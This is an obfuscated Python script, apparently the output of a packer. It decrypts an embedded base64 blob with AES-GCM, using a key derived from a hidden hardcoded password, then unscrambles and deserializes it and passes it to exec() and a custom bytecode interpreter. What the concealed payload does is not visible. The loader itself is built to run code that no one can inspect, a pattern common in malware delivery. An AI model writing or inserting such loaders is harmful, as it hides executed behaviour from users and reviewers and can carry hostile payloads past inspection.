#!/usr/bin/env python3
def _hb(_br):
    return _br % 8073 + 1

import hashlib as _hap, hmac as _mpfyokw, base64 as _nbdtw, sys as _kxc, zlib as _vt
_br = 834707
_vjbg = """1kT4e4aNi8eXwhEfTOkgJnglTrkLZ0x34bLNDnHj7ZheZn9J7wfZkI5ijQ05Hifr8mBEjPuY7+EmV2LjCY0FjLJEEHRJobZw3VFwQL3b6HF5VGZYTYRfMn2fxut/ZU+Os+xv45iuW7EVyTMHWd0OAScE29wR+4QYqDgbZgbdhwWFM/zHUVLe3YMvBk0JSS71B071kNwKy7fUHeUMbPMHQnlyiLXQqZEW2KWnTxF049INWL8hd/4/S4Y15KY="""
_qpuf = 3
_csegje = _hb(_br)

def _vm_run(_code, _consts, _names, _globals, _locals):
    _r = [None] * 64
    _ip = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    while _ip < _n:
        _op = _code[_ip]
        _rd = _code[_ip + 1]
        _rs1 = _code[_ip + 2]
        _rs2 = _code[_ip + 3]
        _imm = _code[_ip + 4] | (_code[_ip + 5] << 8) | (_code[_ip + 6] << 16) | (_code[_ip + 7] << 24)
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 32:
            if not _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*_r[_rs1:_rs1 + (_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1:_rs1 + _rs2])
        elif _op == 44:
            _r[_rd] = list(_r[_rs1:_rs1 + _rs2])
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm * 8
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass
        _ip += 8

def _vm_deserialize(_data):
    _pos = 0
    _hl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _hot = _data[_pos:_pos+_hl].decode('utf-8'); _pos += _hl
    _cc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _data[_pos]; _pos += 1
        _sl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
        _s = _data[_pos:_pos+_sl]; _pos += _sl
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 6: _v = eval(_s)
        elif _t == 7: _v = _s
        elif _t == 8: _v = eval(_s)
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_data[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_data[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    _ic = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _code = _data[_pos:_pos+_ic*8]
    return _hot, _code, _consts, _names

def _ycikz():
    _hx = bytes.fromhex("021412031405")
    _hx = bytes(_ ^ 113 for _ in _hx).decode()
    _flpbkfe = _nbdtw.b64decode(_vjbg)
    if _qpuf == 11:
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _gzhxo = _flpbkfe[16:-32]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=64)
        _sl = _sqfwck[:32]; _gdpku = _sqfwck[32:64]
        _su = _mpfyokw.new(_gdpku, _gzhxo, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _mufnrl = _sl[0]
        _pzswvuj = bytearray()
        for _uj in range(len(_gzhxo)):
            _juedr = _gzhxo[_uj] ^ _mufnrl
            _pzswvuj.append(_juedr)
            _mufnrl = _gzhxo[_uj] ^ _sl[ (_uj + 1) % len(_sl) ]
            _mufnrl = (((_mufnrl << 3) & 0xFF) | (_mufnrl >> 5)) ^ 0x5A
        _pzswvuj = bytes(_pzswvuj)
    elif _qpuf == 10:
        _pzswvuj = bytes.fromhex(_flpbkfe.decode('ascii'))
    elif _qpuf == 6:
        _pzswvuj = _nbdtw.b64decode(_flpbkfe)
    elif _qpuf == 7:
        _pzswvuj = _nbdtw.b32decode(_flpbkfe)
    elif _qpuf == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _wchmurg, algorithms as _qlth, modes as _leigp
        except ImportError:
            _kxc.stderr.write("error: cryptography not installed\n"); _kxc.exit(1)
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _gzhxo = _flpbkfe[16:-32]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=80)
        _sl = _sqfwck[:32]; _avg = _sqfwck[32:48]; _gdpku = _sqfwck[48:80]
        _su = _mpfyokw.new(_gdpku, _gzhxo, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _pkswxf = _wchmurg(_qlth.AES(_sl), _leigp.CTR(_avg))
        _pzswvuj = _pkswxf.decryptor().update(_gzhxo)
    elif _qpuf == 12:
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _gzhxo = _flpbkfe[16:-32]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=64)
        _sl = _sqfwck[:32]; _gdpku = _sqfwck[32:64]
        _su = _mpfyokw.new(_gdpku, _gzhxo, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _mufnrl = 3 + (_juedr[0] & 7)
        _juedr = bytearray(_gzhxo)
        for _uj in range(_mufnrl - 1, -1, -1):
            _hb = (3 + _uj) & 7
            _br = (_uj * 0x1B + 0x5A) & 0xFF
            for _avg in range(len(_juedr)):
                _mufnrl = _juedr[_avg]
                _mufnrl ^= _br
                _mufnrl = ((_mufnrl >> _hb) | ((_mufnrl << (8 - _hb)) & 0xFF))
                _mufnrl ^= _sl[(_uj * len(_juedr) + _avg) % len(_sl)]
                _juedr[_avg] = _mufnrl
        _pzswvuj = bytes(_juedr)
    elif _qpuf == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _wchmurg, algorithms as _qlth, modes as _leigp
        except ImportError:
            _kxc.stderr.write("error: cryptography not installed\n"); _kxc.exit(1)
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _gzhxo = _flpbkfe[16:-32]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=80)
        _sl = _sqfwck[:32]; _avg = _sqfwck[32:48]; _gdpku = _sqfwck[48:80]
        _su = _mpfyokw.new(_gdpku, _gzhxo, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _pkswxf = _wchmurg(_qlth.ChaCha20(_sl, _avg), mode=None)
        _pzswvuj = _pkswxf.decryptor().update(_gzhxo)
    elif _qpuf == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _yoqk
        except ImportError:
            _kxc.stderr.write("error: cryptography not installed\n"); _kxc.exit(1)
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _pzswvuj = _flpbkfe[16:-32]
        _gzhxo = _pzswvuj[:-16]; _mufnrl = _pzswvuj[-16:]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=76)
        _sl = _sqfwck[:32]; _avg = _sqfwck[32:44]; _gdpku = _sqfwck[44:76]
        _su = _mpfyokw.new(_gdpku, _pzswvuj, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _pzswvuj = _yoqk(_sl).decrypt(_avg, _gzhxo + _mufnrl, None)
    elif _qpuf == 8:
        _hcdic = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _ame = {c:i for i,c in enumerate(_hcdic)}
        def _rnnlht(_xhw):
            _uin = bytearray(); _qcpkng = 0
            while _qcpkng < len(_xhw):
                _pj = 0; _sfgg = 0
                while _qcpkng < len(_xhw) and _sfgg < 5:
                    _pj = _pj * 85 + _ame[chr(_xhw[_qcpkng])]; _qcpkng += 1; _sfgg += 1
                _gxztkgp = _sfgg - 1
                if _gxztkgp > 0: _uin.extend(_pj.to_bytes(4, 'big')[4-_gxztkgp:])
            return bytes(_uin)
        _pzswvuj = _rnnlht(_flpbkfe)
    elif _qpuf == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _wchmurg, algorithms as _qlth, modes as _leigp
        except ImportError:
            _kxc.stderr.write("error: cryptography not installed\n"); _kxc.exit(1)
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _gzhxo = _flpbkfe[16:-32]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=80)
        _sl = _sqfwck[:32]; _avg = _sqfwck[32:48]; _gdpku = _sqfwck[48:80]
        _su = _mpfyokw.new(_gdpku, _gzhxo, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _pkswxf = _wchmurg(_qlth.AES(_sl), _leigp.CBC(_avg))
        _pzswvuj = _pkswxf.decryptor()
        _pzswvuj = _pzswvuj.update(_gzhxo) + _pzswvuj.finalize()
        _mufnrl = _pzswvuj[-1]
        if _mufnrl < 1 or _mufnrl > 16 or not all(_ == _mufnrl for _ in _pzswvuj[-_mufnrl:]):
            _kxc.stderr.write("error: decryption failed\n"); _kxc.exit(1)
        _pzswvuj = _pzswvuj[:-_mufnrl]
    elif _qpuf == 9:
        def _fym(_uwzaob):
            if _uwzaob[:2] == b'<~': _uwzaob = _uwzaob[2:]
            if _uwzaob[-2:] == b'~>': _uwzaob = _uwzaob[:-2]
            _aqy = bytearray(); _gh = 0
            while _gh < len(_uwzaob):
                if _uwzaob[_gh] == 122:
                    _aqy.extend(b'\x00\x00\x00\x00'); _gh += 1; continue
                _ao = 0; _gang = 0
                while _gh < len(_uwzaob) and _gang < 5:
                    _ao = _ao * 85 + (_uwzaob[_gh] - 33); _gh += 1; _gang += 1
                _iqhxgmx = _gang - 1
                if _iqhxgmx > 0: _aqy.extend(_ao.to_bytes(4, 'big')[4-_iqhxgmx:])
            return bytes(_aqy)
        _pzswvuj = _fym(_flpbkfe)
    elif _qpuf == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _wchmurg, algorithms as _qlth, modes as _leigp
        except ImportError:
            _kxc.stderr.write("error: cryptography not installed\n"); _kxc.exit(1)
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _gzhxo = _flpbkfe[16:-32]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=64)
        _sl = _sqfwck[:32]; _gdpku = _sqfwck[32:64]
        _su = _mpfyokw.new(_gdpku, _gzhxo, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _pkswxf = _wchmurg(_qlth.AES(_sl), _leigp.ECB())
        _pzswvuj = _pkswxf.decryptor()
        _pzswvuj = _pzswvuj.update(_gzhxo) + _pzswvuj.finalize()
        _mufnrl = _pzswvuj[-1]
        if _mufnrl < 1 or _mufnrl > 16 or not all(_ == _mufnrl for _ in _pzswvuj[-_mufnrl:]):
            _kxc.stderr.write("error: decryption failed\n"); _kxc.exit(1)
        _pzswvuj = _pzswvuj[:-_mufnrl]
    elif _qpuf == 5:
        _juedr = _flpbkfe[:16]; _emld = _flpbkfe[-32:]; _gzhxo = _flpbkfe[16:-32]
        _sqfwck = _hap.pbkdf2_hmac('sha256', _hx.encode(), _juedr, 100000, dklen=64)
        _sl = _sqfwck[:32]; _gdpku = _sqfwck[32:64]
        _su = _mpfyokw.new(_gdpku, _gzhxo, _hap.sha256).digest()
        if not _mpfyokw.compare_digest(_emld, _su):
            _kxc.stderr.write("error: integrity check failed\n"); _kxc.exit(1)
        _pzswvuj = bytes(_gzhxo[i] ^ _sl[i % 32] for i in range(len(_gzhxo)))
    else:
        _kxc.stderr.write("error: unsupported algorithm\n"); _kxc.exit(1)
    _v_k = bytes.fromhex("9fcb397f558bc2913a4bf8b44481649e2e42b36508a0ba3b3eb548e250fe0e83")
    _v_r = bytearray()
    for i in range(len(_pzswvuj[4:])):
        _v_v = ((_pzswvuj[4+i] >> 3) | (_pzswvuj[4+i] << 5)) & 0xFF
        _v_v = _v_v ^ _v_k[i % len(_v_k)]
        _v_r.append(_v_v)
    _xd = bytes(_v_r)
    _pzswvuj, _c, _k, _m = _vm_deserialize(_xd)
    exec(compile(_pzswvuj, '<vm>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals())
if __name__ == '__main__':
    _ycikz()
